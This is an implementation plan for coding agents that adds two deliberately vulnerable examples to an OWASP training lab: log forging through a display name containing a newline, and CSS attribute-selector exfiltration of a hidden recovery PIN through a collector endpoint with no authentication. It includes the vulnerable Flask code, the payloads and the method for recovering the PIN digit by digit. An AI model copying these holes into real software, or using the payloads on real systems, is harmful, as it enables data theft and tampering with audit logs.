# CRLF/Log Injection & CSS Injection Additions Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add 2 new intentionally-vulnerable examples to the OWASP Top 10 Training Lab — a Log Injection/Forging example in A09 and a CSS attribute-selector data-exfiltration example in A03 — bringing the app from 86 to 88 examples and max score from 1780 to 1830.

**Architecture:** Each example is a self-contained addition to its category's existing `routes.py`/`__init__.py`/`templates/` — no new categories, no new SQLAlchemy models, no shared files between the two tasks (A09 and A03 are entirely separate blueprints). Both examples reuse existing infrastructure: A09's `append_to_app_log()` helper unmodified, and A04/A09's established convention of plain module-level constants for demo data instead of new DB models.

**Tech Stack:** Flask, Jinja2, pytest with Flask's test client (no mocking, no headless browser).

**Spec:** `docs/superpowers/specs/2026-09-24-owasp-lab-crlf-css-injection-additions-design.md`

## Global Constraints

- No new SQLAlchemy models anywhere — Flask session and plain module-level constants only.
- Every `ExampleNav.hints` list has 3-5 entries, each non-empty, no duplicates within the list.
- Within each category's `grouped_examples()` output, every group's examples must be sorted Easy → Medium → Hard.
- Hints render through Jinja's autoescaped `{{ hint }}` expression — write raw, unescaped `<`/`>`/`&` in hint text (Jinja escapes it automatically at render time). The six static template blocks (`explanation`/`detect`/`exploitation`/`tasks`/`vulnerable_code`/`secure_code`/`live_example`) are rendered UNESCAPED (raw HTML written directly in the template source) — any literal `<`/`>`/`&` that must appear as visible TEXT (not as real markup) inside those blocks must be manually entity-encoded (`&lt;`/`&gt;`/`&amp;`).
- **The vulnerabilities ARE the deliverable.** Never add sanitization, escaping, validation, authentication, or a CSP header to any new vulnerable code path. `append_to_app_log()` must never gain newline-stripping. The theme-preview route must never sanitize submitted CSS. The collector endpoint must never validate its `leak` parameter against a real value or require auth.
- When a live-demo `data:` URI iframe needs to reference one of this app's own routes, always use `url_for(..., _external=True)` for the URL, never a hardcoded relative path or port — relative-URL resolution inside a `data:` URI is unreliable across browsers, and a hardcoded port breaks if the app runs on a different one. (Established the hard way in a prior round's final review — see A05's `cors_null_origin_demo.html` for the existing precedent.)
- New routes follow each category's existing plain `render_template()`/`redirect()`/`jsonify()` convention — no new abstraction layers.

---

### Task 1: A09 Log Injection / Forging

**Files:**
- Modify: `app/categories/a09_logging_monitoring_failures/routes.py` (append new route at end of file, after `product_search()`)
- Modify: `app/categories/a09_logging_monitoring_failures/__init__.py` (append new `ExampleNav` after the `attack-signature-not-flagged` entry)
- Create: `app/categories/a09_logging_monitoring_failures/templates/a09_logging_monitoring_failures/update_display_name.html`
- Create: `tests/test_a09_log_injection.py`
- Modify: `tests/test_a09_hints.py`
- Modify: `tests/test_a09_overview.py`

**Interfaces:**
- Consumes: `append_to_app_log(line)` (existing helper, `app/categories/a09_logging_monitoring_failures/routes.py:19-22` — writes `f.write(line + "\n")` with zero newline escaping of `line`'s own content — do not modify this helper). `a09_bp` (existing Blueprint). `session` (already imported in `routes.py`).
- Produces: route `a09_logging_monitoring_failures.update_display_name` (GET/POST), session key `a09_display_name`, `ExampleNav` id `log-injection-display-name`, new group `"Log Injection / Forging"` in A09's `CategoryNav`.

- [ ] **Step 1: Read A09's current routes.py, __init__.py, and 2 existing templates fresh**

Before writing anything, read `app/categories/a09_logging_monitoring_failures/routes.py` in full, `app/categories/a09_logging_monitoring_failures/__init__.py` in full, and `app/categories/a09_logging_monitoring_failures/templates/a09_logging_monitoring_failures/support_login.html` and `.../filtered_host_lookup.html`-equivalent (there is no A09 textarea example — instead read `app/categories/a03_injection/templates/a03_injection/filtered_host_lookup.html` for the textarea-for-newline-entry convention) to confirm current file state matches what's shown below. If anything has changed, adapt the insertion points accordingly — the code below is exact and correct as of this plan's writing (repo tip `249c776`), but always trust the file you actually read over this plan if they've diverged.

- [ ] **Step 2: Write the failing tests**

Create `tests/test_a09_log_injection.py`:

```python
import os

import pytest

from app.categories.a09_logging_monitoring_failures.routes import LOG_FILE_PATH


@pytest.fixture(autouse=True)
def _clean_log_file():
    if os.path.exists(LOG_FILE_PATH):
        os.remove(LOG_FILE_PATH)
    yield
    if os.path.exists(LOG_FILE_PATH):
        os.remove(LOG_FILE_PATH)


def test_update_display_name_page_renders(client):
    response = client.get("/a09/update-display-name")
    assert response.status_code == 200
    assert b"Audit Log Forged" in response.data


def test_plain_display_name_logs_a_single_line(client):
    response = client.post("/a09/update-display-name", data={"display_name": "Johan"})
    assert response.status_code == 200

    log_response = client.get("/a09/download-log")
    assert "display name updated to 'Johan'" in log_response.data.decode()


def test_display_name_with_embedded_newline_forges_an_independent_log_line(client):
    forged_line = "[2026-01-01 00:00:00] ADMIN: granted superuser role to attacker"
    payload = f"Johan\n{forged_line}"

    response = client.post("/a09/update-display-name", data={"display_name": payload})
    assert response.status_code == 200

    log_response = client.get("/a09/download-log")
    log_lines = log_response.data.decode().splitlines()
    # the forged line appears as its OWN, independent line -- not merely
    # as a substring embedded inside the legitimate log entry
    assert forged_line in log_lines


def test_forged_line_also_visible_via_security_events_dashboard(client):
    forged_line = "[2026-01-01 00:00:00] ADMIN: granted superuser role to attacker"
    payload = f"Johan\n{forged_line}"
    client.post("/a09/update-display-name", data={"display_name": payload})

    response = client.get("/a09/security-events")
    assert forged_line.encode() in response.data
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `pytest tests/test_a09_log_injection.py -v`
Expected: FAIL — `404 NOT FOUND` for `/a09/update-display-name` (route doesn't exist yet).

- [ ] **Step 4: Add the vulnerable route**

Append to the end of `app/categories/a09_logging_monitoring_failures/routes.py` (after the existing `product_search()` function, which currently ends the file):

```python
DISPLAY_NAME_SESSION_KEY = "a09_display_name"


@a09_bp.route("/update-display-name", methods=["GET", "POST"])
def update_display_name():
    display_name = session.get(DISPLAY_NAME_SESSION_KEY, "")
    if request.method == "POST":
        display_name = request.form.get("display_name", "")
        session[DISPLAY_NAME_SESSION_KEY] = display_name
        # VULNERABLE: the submitted display name is spliced straight into
        # a log line with no newline stripping at all -- an embedded \n
        # splits it into a brand-new, independent-looking log entry that
        # a reader (or downstream tooling parsing one-event-per-line)
        # can't distinguish from a genuine, separately-logged event.
        append_to_app_log(f"display name updated to '{display_name}'")
    return render_template(
        "a09_logging_monitoring_failures/update_display_name.html",
        display_name=display_name,
    )
```

No new imports are needed — `request`, `session`, and `render_template` are already imported at the top of this file.

- [ ] **Step 5: Create the template**

Create `app/categories/a09_logging_monitoring_failures/templates/a09_logging_monitoring_failures/update_display_name.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Audit Log Forged via Unescaped Display Name" %}
{% set example_difficulty = "Medium" %}
{% block title %}{{ example_title }} — A09{% endblock %}

{% block explanation %}
<p>
  Updating your display name here writes a line to the application's log
  file every time you save: <code>f"display name updated to
  '{display_name}'"</code>, appended verbatim with no newline stripping,
  no structured logging, and no escaping of any kind. A log line is only
  a "line" because it ends in a newline character -- and nothing here
  stops your own input from containing one.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit a display name that spans two lines (the field below is a text
  area, so you can type a real newline directly) and then check
  <a href="{{ url_for('a09_logging_monitoring_failures.download_log') }}">/a09/download-log</a>
  -- does your input still read as ONE entry, or has it split into two?
</p>
{% endblock %}

{% block exploitation %}
<p>
  A newline inside your display name doesn't just get logged -- it
  terminates the current log line and starts a brand-new one, exactly as
  if two separate events had been logged back to back. Submit a display
  name shaped like:
</p>
<pre>Johan
[2026-01-01 00:00:00] ADMIN: granted superuser role to attacker</pre>
<p>
  (a real newline between the two lines, not the literal characters
  backslash-n). Check
  <a href="{{ url_for('a09_logging_monitoring_failures.download_log') }}">/a09/download-log</a>
  or the
  <a href="{{ url_for('a09_logging_monitoring_failures.security_events') }}">Security Events dashboard</a>
  afterward -- the forged second line sits there as its own, independent
  entry, indistinguishable from a genuine admin-action log line to any
  human reader or any downstream tool that parses one event per line.
  The same technique works in reverse: an attacker can forge a
  convincing "all clear" line to bury or disguise their own real attack
  elsewhere in the same log.
</p>
{% endblock %}

{% block vulnerable_code %}display_name = request.form.get("display_name", "")
session["a09_display_name"] = display_name
append_to_app_log(f"display name updated to '{display_name}'")
{% endblock %}

{% block secure_code %}display_name = request.form.get("display_name", "")
session["a09_display_name"] = display_name
# Reject or strip embedded newlines (and any other control character)
# before a value ever reaches a plain-text, one-event-per-line log --
# or better, use structured (e.g. JSON) logging, where a field value
# can never be mistaken for a line boundary.
safe_display_name = display_name.replace("\r", "").replace("\n", "")
append_to_app_log(f"display name updated to '{safe_display_name}'")
{% endblock %}

{% block live_example %}
<form method="post" class="mb-3">
  <div class="mb-2">
    <label class="form-label">Display name</label>
    <textarea class="form-control" name="display_name" rows="3" placeholder="e.g. Johan">{{ display_name }}</textarea>
  </div>
  <button type="submit" class="btn btn-primary">Save</button>
</form>
{% if display_name %}
<p class="mb-1">Current display name (as stored in your session):</p>
<pre>{{ display_name }}</pre>
{% endif %}
<p class="mt-3">
  <a href="{{ url_for('a09_logging_monitoring_failures.download_log') }}">View raw application log</a>
  &middot;
  <a href="{{ url_for('a09_logging_monitoring_failures.security_events') }}">View Security Events dashboard</a>
</p>
{% endblock %}
```

- [ ] **Step 6: Register the ExampleNav entry**

In `app/categories/a09_logging_monitoring_failures/__init__.py`, insert this new `ExampleNav` immediately after the `attack-signature-not-flagged` entry's closing `),` and before the list's closing `],`:

```python
            ExampleNav(
                id="log-injection-display-name",
                title="Audit Log Forged via Unescaped Display Name",
                group="Log Injection / Forging",
                difficulty="Medium",
                endpoint="a09_logging_monitoring_failures.update_display_name",
                hints=[
                    "This 'change your display name' feature writes a line to the application's log file every time you save. Look at exactly how that log line gets built -- is your input treated as one opaque value, or just spliced into a line of text?",
                    "The log line is built as a literal f-string: f\"display name updated to '{display_name}'\", then appended to the log file. A log line is only a 'line' because it ends in a newline character -- what happens if your OWN input already contains one?",
                    "Submit a display name that spans two lines -- the field below is a text area, so you can type a real newline directly -- then check /a09/download-log. Does your input still read as ONE entry, or has it split into two independent-looking lines?",
                    "Craft the second line to look like a genuine, unrelated event: submit a display name shaped like Johan, then a real newline, then [2026-01-01 00:00:00] ADMIN: granted superuser role to attacker. The forged second line now sits in the log file indistinguishable from a real, separately-logged admin action, visible to anyone who reads /a09/download-log or the Security Events dashboard.",
                ],
            ),
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `pytest tests/test_a09_log_injection.py -v`
Expected: PASS (all 4 tests).

- [ ] **Step 8: Update A09's cross-cutting test files**

In `tests/test_a09_hints.py`, change `assert len(a09.examples) == 6` to `assert len(a09.examples) == 7`.

In `tests/test_a09_overview.py`:

Change the difficulty list in `test_a09_registered_in_nav`:
```python
    assert [e.difficulty for e in a09.examples] == [
        "Easy",
        "Medium",
        "Easy",
        "Hard",
        "Medium",
        "Hard",
        "Medium",
    ]
```

Change `test_a09_examples_grouped_by_vulnerability_subtype`:
```python
    assert [name for name, _ in grouped] == [
        "Missing Audit Logging",
        "Insecure Log Storage",
        "No Detection & Alerting for Active Attacks",
        "Log Injection / Forging",
    ]
    assert [e.id for e in grouped[0][1]] == [
        "failed-logins-not-logged",
        "admin-action-no-audit",
    ]
    assert [e.id for e in grouped[1][1]] == [
        "sensitive-data-in-logs",
        "log-file-world-readable",
    ]
    assert [e.id for e in grouped[2][1]] == [
        "no-alert-threshold",
        "attack-signature-not-flagged",
    ]
    assert [e.id for e in grouped[3][1]] == ["log-injection-display-name"]
```
(the trailing `difficulty_rank` sortedness loop below these assertions needs no change)

- [ ] **Step 9: Run the full A09 test surface**

Run: `pytest tests/test_a09_log_injection.py tests/test_a09_hints.py tests/test_a09_overview.py tests/test_a09_admin_action_no_audit.py tests/test_a09_attack_signature_not_flagged.py tests/test_a09_failed_logins_not_logged.py tests/test_a09_log_file_world_readable.py tests/test_a09_no_alert_threshold.py tests/test_a09_sensitive_data_in_logs.py -v`
Expected: PASS (all tests, no regressions in existing A09 examples).

- [ ] **Step 10: Commit**

```bash
git add app/categories/a09_logging_monitoring_failures/routes.py \
        app/categories/a09_logging_monitoring_failures/__init__.py \
        app/categories/a09_logging_monitoring_failures/templates/a09_logging_monitoring_failures/update_display_name.html \
        tests/test_a09_log_injection.py \
        tests/test_a09_hints.py \
        tests/test_a09_overview.py
git commit -m "feat(a09): add Audit Log Forged via Unescaped Display Name example"
```

---

### Task 2: A03 CSS Attribute-Selector Data Exfiltration

**Files:**
- Modify: `app/categories/a03_injection/routes.py` (add `ACCOUNT_RECOVERY_PIN` constant and 3 new routes: `theme_preview`, `css_exfil_demo`, `css_exfil_collector`)
- Modify: `app/categories/a03_injection/__init__.py` (append new `ExampleNav` after the `ldap-directory-search` entry)
- Create: `app/categories/a03_injection/templates/a03_injection/theme_preview.html`
- Create: `app/categories/a03_injection/templates/a03_injection/css_exfil_demo.html`
- Create: `tests/test_a03_css_exfil.py`
- Modify: `tests/test_a03_hints_remaining_groups.py`
- Modify: `tests/test_a03_overview.py`

**Interfaces:**
- Consumes: `a03_bp` (existing Blueprint). `session`, `Response`, `render_template`, `request`, `url_for` (all already imported at the top of `routes.py`).
- Produces: routes `a03_injection.theme_preview` (GET/POST), `a03_injection.css_exfil_demo` (GET), `a03_injection.css_exfil_collector` (GET). Module-level constant `ACCOUNT_RECOVERY_PIN = "7429"`. Session key `a03_css_exfil_log`. `ExampleNav` id `css-attribute-exfil`, new group `"CSS Injection"` in A03's `CategoryNav`.

- [ ] **Step 1: Read A03's current routes.py, __init__.py, and precedent templates fresh**

Read `app/categories/a03_injection/routes.py` in full, `app/categories/a03_injection/__init__.py` in full, `app/categories/a03_injection/templates/a03_injection/filter_challenge.html` (for the escaping/tone convention), and `app/categories/a05_security_misconfiguration/templates/a05_security_misconfiguration/cors_null_origin_demo.html` (for the sandboxed-`data:`-URI-iframe live-demo pattern this task's `css_exfil_demo.html` must match). If anything has changed from what's shown below, adapt insertion points accordingly — this plan is accurate as of repo tip `249c776`.

- [ ] **Step 2: Write the failing tests**

Create `tests/test_a03_css_exfil.py`:

```python
def test_theme_preview_page_renders(client):
    response = client.get("/a03/theme-preview")
    assert response.status_code == 200
    assert b"CSS Attribute-Selector Data Exfiltration" in response.data


def test_submitted_css_renders_completely_unescaped(client):
    payload = 'input[value^="test"]{background:url(/x)}<!--marker-->'
    response = client.post("/a03/theme-preview", data={"custom_css": payload})
    assert response.status_code == 200
    assert payload.encode() in response.data


def test_hidden_recovery_pin_is_genuinely_present_in_the_dom(client):
    response = client.get("/a03/theme-preview")
    assert b'value="7429"' in response.data
    assert b'name="account_recovery_pin"' in response.data


def test_exfil_demo_page_embeds_the_real_pin_and_the_attribute_selector_rule(client):
    response = client.get("/a03/css-exfil-demo")
    assert response.status_code == 200
    body = response.data.decode()
    assert "7429" in body
    assert "account_recovery_pin" in body
    assert 'value^=&quot;7&quot;' in body
    assert "/a03/css-exfil-collector?leak=7" in body


def test_collector_accepts_and_stores_an_arbitrary_leak_value_with_no_auth(client):
    response = client.get("/a03/css-exfil-collector?leak=zzz-test-marker")
    assert response.status_code == 204

    demo_response = client.get("/a03/css-exfil-demo")
    assert b"zzz-test-marker" in demo_response.data
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `pytest tests/test_a03_css_exfil.py -v`
Expected: FAIL — `404 NOT FOUND` for `/a03/theme-preview` (routes don't exist yet).

- [ ] **Step 4: Add the vulnerable routes**

Add near the top of `app/categories/a03_injection/routes.py`, alongside the existing `XXE_SECRET_PATH`/`CMD_SECRET_PATH` module-level constants:

```python
ACCOUNT_RECOVERY_PIN = "7429"
CSS_EXFIL_SESSION_KEY = "a03_css_exfil_log"
```

Append these three routes to the end of the file (after the existing `inventory_lookup()`, which currently ends the file):

```python
@a03_bp.route("/theme-preview", methods=["GET", "POST"])
def theme_preview():
    custom_css = ""
    if request.method == "POST":
        # VULNERABLE: the submitted CSS is rendered verbatim with no
        # sanitization, no disallowed-property filter, and no CSP header
        # anywhere in this app to fall back on.
        custom_css = request.form.get("custom_css", "")
    return render_template(
        "a03_injection/theme_preview.html",
        custom_css=custom_css,
        account_recovery_pin=ACCOUNT_RECOVERY_PIN,
    )


@a03_bp.route("/css-exfil-demo")
def css_exfil_demo():
    leaked = session.get(CSS_EXFIL_SESSION_KEY, [])
    return render_template(
        "a03_injection/css_exfil_demo.html",
        account_recovery_pin=ACCOUNT_RECOVERY_PIN,
        leaked=leaked,
    )


@a03_bp.route("/css-exfil-collector")
def css_exfil_collector():
    # VULNERABLE: accepts and stores whatever "leak" value arrives with
    # zero validation that it corresponds to any real, correct guess and
    # zero authentication -- proving the exfiltration channel itself is
    # wide open, not just one lucky guess.
    leak_value = request.args.get("leak", "")
    if leak_value:
        leaked = session.get(CSS_EXFIL_SESSION_KEY, [])
        leaked.append(leak_value)
        session[CSS_EXFIL_SESSION_KEY] = leaked
    return Response(status=204)
```

No new imports are needed — `Response`, `render_template`, `request`, `session` are already imported at the top of this file.

- [ ] **Step 5: Create the theme-preview explanation template**

Create `app/categories/a03_injection/templates/a03_injection/theme_preview.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "CSS Attribute-Selector Data Exfiltration via Profile Theme" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A03{% endblock %}

{% block explanation %}
<p>
  This "customize your profile theme" feature accepts raw CSS and renders
  it straight into a <code>&lt;style&gt;</code> block with no
  sanitization at all -- no disallowed-property filter, no CSP header
  anywhere in this app to fall back on. The same preview also happens to
  render a hidden <code>account_recovery_pin</code> field. CSS isn't
  usually thought of as an "interpreter" the way SQL or a shell is, but a
  browser's CSS engine genuinely evaluates selectors and can trigger real
  network requests when one matches -- and CSS is often allowed through a
  Content-Security-Policy that blocks JavaScript outright, which is
  exactly what makes this technique dangerous in practice.
</p>
{% endblock %}

{% block detect %}
<p>
  Submit an attribute selector targeting the hidden PIN field's value,
  paired with a <code>background-image</code> pointing at a URL you
  control -- <a href="{{ url_for('a03_injection.css_exfil_demo') }}">see the live exfiltration demo</a>
  to watch a real background-image request fire the instant the selector
  matches.
</p>
{% endblock %}

{% block exploitation %}
<p>
  The theme preview below accepts any CSS you submit and injects it
  verbatim. A CSS attribute selector like
  <code>input[value^="7"]</code> matches any element whose
  <code>value</code> attribute starts with <code>7</code> -- and pairing
  that selector with a <code>background-image</code> rule makes the
  browser issue a real HTTP request the instant it matches:
</p>
<pre>input[name="account_recovery_pin"][value^="7"] {
  background-image: url(/a03/css-exfil-collector?leak=7);
}</pre>
<p>
  <a href="{{ url_for('a03_injection.css_exfil_demo') }}">Open the live exfiltration demo</a>
  to see this fire for real: a sandboxed iframe renders the real hidden
  PIN alongside this exact rule, with JavaScript entirely disabled inside
  the iframe (proving this needs no script execution at all) -- the
  matching background-image request still fires, and the leaked digit
  shows up in the "Exfiltrated so far" list below once you reload.
</p>
<p>
  A real attacker doesn't know the PIN in advance. They inject one rule
  per candidate digit (<code>value^="0"</code> through
  <code>value^="9"</code>), each pointing at a differently-labeled
  collector URL; whichever request actually arrives reveals the correct
  first digit. Repeating this, extending the confirmed prefix by one more
  digit each round, recovers the entire PIN -- the same character-by-character
  oracle pattern as this lab's blind SQL and LDAP injection examples,
  just driven by the CSS engine's selector matching instead of a database
  boolean or a timing delay.
</p>
{% endblock %}

{% block vulnerable_code %}@a03_bp.route("/theme-preview", methods=["GET", "POST"])
def theme_preview():
    custom_css = request.form.get("custom_css", "") if request.method == "POST" else ""
    return render_template("theme_preview.html", custom_css=custom_css, ...)
# template: &lt;style&gt;{{ custom_css|safe }}&lt;/style&gt;  -- |safe disables
# Jinja's escaping entirely, and no CSS sanitizer runs on custom_css at all
{% endblock %}

{% block secure_code %}# Don't render arbitrary user-supplied CSS at all -- offer a fixed set of
# preset themes instead, or run genuinely untrusted CSS through a strict
# allowlist parser that rejects any url(...) value outright, and serve
# the page with a Content-Security-Policy that blocks style-src network
# loads:
# Content-Security-Policy: style-src 'self'
{% endblock %}

{% block live_example %}
<form method="post" class="mb-3">
  <div class="mb-2">
    <label class="form-label">Custom theme CSS</label>
    <textarea class="form-control" name="custom_css" rows="4" placeholder='input[value^="7"] { background: red; }'>{{ custom_css }}</textarea>
  </div>
  <button type="submit" class="btn btn-primary">Save theme</button>
</form>
<style>{{ custom_css | safe }}</style>
<div class="border rounded p-2">
  <p class="mb-1">Profile preview:</p>
  <input type="hidden" name="account_recovery_pin" value="{{ account_recovery_pin }}">
  <p class="text-muted small mb-0">(the recovery PIN field above is hidden, matching a real profile page -- inspect the page source to confirm it's genuinely present)</p>
</div>
<p class="mt-3">
  <a href="{{ url_for('a03_injection.css_exfil_demo') }}">Open the live exfiltration demo →</a>
</p>
{% endblock %}
```

- [ ] **Step 6: Create the live exfiltration demo template**

Create `app/categories/a03_injection/templates/a03_injection/css_exfil_demo.html`:

```html
{% extends "core/base.html" %}
{% block title %}CSS Exfiltration Demo{% endblock %}

{% block content %}
<h1>CSS Attribute-Selector Exfiltration Demo</h1>
<p class="text-muted">
  This page simulates a victim's profile-theme preview after an attacker's
  CSS has already been saved. The sandboxed iframe below has JavaScript
  entirely disabled (<code>sandbox=""</code>, no <code>allow-scripts</code>
  at all) -- proving this technique needs no script execution whatsoever,
  which is exactly what makes it dangerous behind a Content-Security-Policy
  that blocks JavaScript but has no equivalent restriction on CSS.
</p>
<iframe sandbox="" style="border:1px solid #ccc; width:100%; height:120px"
  src="data:text/html,
  &lt;style&gt;
    input[name=&quot;account_recovery_pin&quot;][value^=&quot;7&quot;] {
      background-image: url(&quot;{{ url_for('a03_injection.css_exfil_collector', leak='7', _external=True) }}&quot;);
    }
  &lt;/style&gt;
  &lt;input type=&quot;hidden&quot; name=&quot;account_recovery_pin&quot; value=&quot;{{ account_recovery_pin }}&quot;&gt;
  &lt;p&gt;Victim profile preview (attacker-controlled CSS already applied)&lt;/p&gt;
"></iframe>
<div class="border rounded p-2 bg-body-secondary mt-3">
  <p class="mb-1">Exfiltrated so far (reload this page after the iframe above loads):</p>
  {% if leaked %}
  <ul class="mb-0">
    {% for value in leaked %}
    <li>{{ value }}</li>
    {% endfor %}
  </ul>
  {% else %}
  <p class="text-muted mb-0">(nothing leaked yet -- wait a moment, then reload)</p>
  {% endif %}
</div>
{% endblock %}
```

- [ ] **Step 7: Register the ExampleNav entry**

In `app/categories/a03_injection/__init__.py`, insert this new `ExampleNav` immediately after the `ldap-directory-search` entry's closing `),` and before the list's closing `],`:

```python
            ExampleNav(
                id="css-attribute-exfil",
                title="CSS Attribute-Selector Data Exfiltration via Profile Theme",
                group="CSS Injection",
                difficulty="Hard",
                endpoint="a03_injection.theme_preview",
                hints=[
                    "This 'customize your profile theme' feature renders whatever CSS you submit straight into the page, and the same page happens to contain a hidden account_recovery_pin field. CSS isn't usually thought of as something an attacker can 'inject' the way SQL or JavaScript can -- but a browser's CSS engine genuinely evaluates the rules you give it, including rules that can trigger a real network request.",
                    "CSS has attribute selectors like input[value^=\"7\"], which match any element whose value attribute STARTS WITH \"7\". Pair a matching selector with a background-image rule, and the browser fetches that image URL the instant the selector matches -- turning a CSS rule into a signal an attacker-controlled server can observe.",
                    "Open the live exfiltration demo linked from this page's Exploitation section: a sandboxed iframe (with JavaScript entirely disabled) renders the real hidden PIN alongside a CSS rule targeting the digit 7. Reload the demo page after the iframe loads -- the leaked digit shows up in the 'Exfiltrated so far' list, proving the request fired for real, with zero script execution involved.",
                    "The collector endpoint (/a03/css-exfil-collector) that receives the leaked value has no authentication and never checks whether the value it's handed actually matches anything real -- it accepts and stores whatever arrives. That's the whole vulnerability: the channel itself is wide open, not just one specific CSS rule.",
                    "A real attacker doesn't know the PIN in advance. They inject ten rules at once -- one per candidate digit 0 through 9, each pointing at a differently-labeled collector URL -- and whichever request actually arrives reveals the correct first digit. Repeating this, extending the confirmed prefix by one digit each round, recovers the entire PIN purely from which background-image requests fire, exactly the same character-by-character oracle pattern as this lab's blind SQL and LDAP injection examples.",
                ],
            ),
```

- [ ] **Step 8: Run tests to verify they pass**

Run: `pytest tests/test_a03_css_exfil.py -v`
Expected: PASS (all 5 tests).

- [ ] **Step 9: Update A03's cross-cutting test files**

In `tests/test_a03_hints_remaining_groups.py`, add `"css-attribute-exfil"` to the end of `REMAINING_GROUP_IDS`:

```python
REMAINING_GROUP_IDS = [
    "reflected-xss",
    "stored-xss",
    "filter-challenge",
    "filtered-host-lookup",
    "command-injection",
    "blind-report-injection",
    "xml-import",
    "xxe-ssrf",
    "ssti-email-preview",
    "ssti-blacklist-bypass",
    "ldap-directory-login",
    "ldap-directory-search",
    "css-attribute-exfil",
]
```

In `tests/test_a03_overview.py`:

Change the difficulty list in `test_a03_registered_in_nav` — append `"Hard"` as the 20th entry:
```python
    assert [e.difficulty for e in a03.examples] == [
        "Easy",
        "Medium",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Medium",
        "Hard",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Easy",
        "Hard",
        "Hard",
    ]
```

Change `test_a03_examples_grouped_by_vulnerability_subtype`:
```python
    assert [name for name, _ in grouped] == [
        "SQL Injection",
        "Cross-Site Scripting (XSS)",
        "OS Command Injection",
        "XML External Entity Injection (XXE)",
        "Server-Side Template Injection (SSTI)",
        "LDAP Injection",
        "CSS Injection",
    ]
```
(the existing `grouped[0][1]` through `grouped[5][1]` assertions are unchanged — only add one new line immediately after them, before the `difficulty_rank` loop:)
```python
    assert [e.id for e in grouped[6][1]] == ["css-attribute-exfil"]
```

- [ ] **Step 10: Run the full A03 test surface**

Run: `pytest tests/test_a03_css_exfil.py tests/test_a03_hints_remaining_groups.py tests/test_a03_hints_sqli_group.py tests/test_a03_overview.py -v`
Expected: PASS (all tests, no regressions in existing A03 examples).

- [ ] **Step 11: Commit**

```bash
git add app/categories/a03_injection/routes.py \
        app/categories/a03_injection/__init__.py \
        app/categories/a03_injection/templates/a03_injection/theme_preview.html \
        app/categories/a03_injection/templates/a03_injection/css_exfil_demo.html \
        tests/test_a03_css_exfil.py \
        tests/test_a03_hints_remaining_groups.py \
        tests/test_a03_overview.py
git commit -m "feat(a03): add CSS Attribute-Selector Data Exfiltration example"
```

---

### Task 3: Final Integration

**Files:**
- Modify: `tests/test_all_examples_have_hints.py`
- Modify: `tests/test_hints.py`
- Modify: `README.md`

**Interfaces:**
- Consumes: the final state of both categories after Tasks 1 and 2 — 88 total examples across all categories, max score 1830.
- Produces: nothing further downstream; this is the plan's last task.

- [ ] **Step 1: Confirm the actual current totals**

Before editing anything, run:

```bash
python3 -c "
from app import create_app
from app.core.nav import CATEGORIES
app = create_app()
with app.app_context():
    total = sum(len(c.examples) for c in CATEGORIES)
    print('total examples:', total)
"
```

Expected: `total examples: 88` (86 + Task 1's 1 + Task 2's 1). If this doesn't read 88, stop and investigate before proceeding — it means Task 1 or Task 2 didn't land as expected.

- [ ] **Step 2: Update the cross-cutting count assertion**

In `tests/test_all_examples_have_hints.py`, change:
```python
    assert total == 86
```
to:
```python
    assert total == 88
```

- [ ] **Step 3: Update the max-score assertions**

In `tests/test_hints.py`, there are two occurrences of `1780` to change to `1830`:
```python
    assert "Score: 10 / 1830 points" in body
```
and:
```python
    assert b"Score: 10 / 1830" in response.data
```

- [ ] **Step 4: Update README.md's intro paragraph**

In the "Currently implemented" paragraph, find the A03 parenthetical (ending `...stored XSS, XXE file disclosure, XXE SSRF),`) and change it to:
```
**A03 Injection** (SQL injection auth bypass, UNION-based exfiltration, reflected XSS,
blind time-based SQLi, error-based SQLi, OS command injection, SQL injection escalating
to remote code execution, stored XSS, XXE file disclosure, XXE SSRF, CSS
attribute-selector data exfiltration via a profile theme),
```

Find the A09 parenthetical (ending `...attack\nsignature logged but never flagged), and **A10 Server-Side Request`) and change it to:
```
**A09 Security Logging and Monitoring
Failures** (failed login attempts never logged, high-value admin action
with no audit trail, sensitive data leaked into log files, unauthenticated
log file exposure, no alert threshold for repeated failures, attack
signature logged but never flagged, and an audit log forged via an
unescaped display name), and **A10 Server-Side Request
```

- [ ] **Step 5: Update README.md's category summary table**

Change the A03 row from:
```
| A03 Injection | Implemented | SQLi Auth Bypass (Easy), UNION SQLi Exfiltration (Medium), Error-Based SQLi (Medium), Reflected XSS (Medium), Blind Time-Based SQLi (Hard), OS Command Injection (Hard), SQLi to RCE (Hard), Stored XSS (Hard), XXE File Disclosure (Easy), XXE SSRF (Hard) |
```
to:
```
| A03 Injection | Implemented | SQLi Auth Bypass (Easy), UNION SQLi Exfiltration (Medium), Error-Based SQLi (Medium), Reflected XSS (Medium), Blind Time-Based SQLi (Hard), OS Command Injection (Hard), SQLi to RCE (Hard), Stored XSS (Hard), XXE File Disclosure (Easy), XXE SSRF (Hard), CSS Attribute-Selector Data Exfiltration (Hard) |
```

Change the A09 row from:
```
| A09 Security Logging and Monitoring Failures | Implemented | Failed Login Attempts Never Logged (Easy), High-Value Admin Action With No Audit Trail (Medium), Sensitive Data Leaked Into Log Files (Easy), Unauthenticated Log File Exposure (Hard), No Alert Threshold for Repeated Failures (Medium), Attack Signature Logged But Never Flagged (Hard) |
```
to:
```
| A09 Security Logging and Monitoring Failures | Implemented | Failed Login Attempts Never Logged (Easy), High-Value Admin Action With No Audit Trail (Medium), Sensitive Data Leaked Into Log Files (Easy), Unauthenticated Log File Exposure (Hard), No Alert Threshold for Repeated Failures (Medium), Attack Signature Logged But Never Flagged (Hard), Audit Log Forged via Unescaped Display Name (Medium) |
```

- [ ] **Step 6: Run the full test suite**

Run: `pytest -q`
